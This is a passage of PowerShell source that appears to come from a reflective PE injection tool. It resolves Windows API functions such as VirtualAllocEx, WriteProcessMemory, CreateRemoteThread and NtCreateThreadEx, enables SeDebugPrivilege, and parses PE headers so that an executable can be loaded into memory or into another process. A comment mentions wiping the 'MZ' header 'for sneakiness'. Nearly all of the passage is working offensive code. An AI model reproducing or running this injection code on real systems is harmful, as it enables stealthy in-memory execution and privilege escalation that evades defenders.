		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
